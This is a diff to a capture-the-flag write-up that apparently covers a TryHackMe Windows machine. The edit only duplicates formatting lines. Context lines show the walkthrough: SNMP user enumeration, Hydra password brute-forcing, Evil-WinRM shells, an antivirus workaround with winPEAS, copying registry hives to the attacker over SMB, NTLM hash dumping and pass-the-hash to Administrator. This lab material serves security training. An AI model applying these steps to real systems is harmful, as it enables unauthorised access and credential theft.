@@ -57,6 +57,7 @@ PORT      STATE SERVICE       VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 ```
 {: .nolineno}
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -87,6 +88,7 @@ iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.11
 iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
 
 ```
+{: .nolineno}
 {: .nolineno}
 
 I then brute-forced the other open services with this <span style="color:#61ffe5">Jareth</span> as username and I used this password list to brute-force the services `/usr/share/wordlists/metasploit/unix_passwords.txt` through <mark style="background: #FF5582A6;">Hydra</mark> Tool.
@@ -145,6 +147,7 @@ THM{FLAG_FLAG_FLAG_FLAG_FLAG}
 *Evil-WinRM* PS C:\Users\Jareth> 
 ```
 {: .nolineno}
+{: .nolineno}
 
 Due to Antivirus I was not able to run <span style="color:#f04276">winPEAS.exe</span> file but I uploaded <span style="color:#61ffe5">.ps1</span> file of it from [here](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1) .
 
@@ -175,6 +178,7 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001>
 ```
 {: .nolineno}
+{: .nolineno}
 
 After that I copy these 2 files into attackers machine with smb shares like this ⤵️
 
@@ -197,6 +201,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d15416955
 Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17.....55a:::
 [*] Cleaning up... 
 ```
+{: .nolineno}
 {: .nolineno}
 
 Lets Pass-the-Hash and get a Administrators shell 🔽
@@ -243,6 +248,7 @@ C:.
 THM{FLAG_FLAG_FLAG_FLAG_FLAG}
 *Evil-WinRM* PS C:\Users\Administrator> 
 ```
+{: .nolineno}
 {: .nolineno}
 
 I am Administrator Now !!
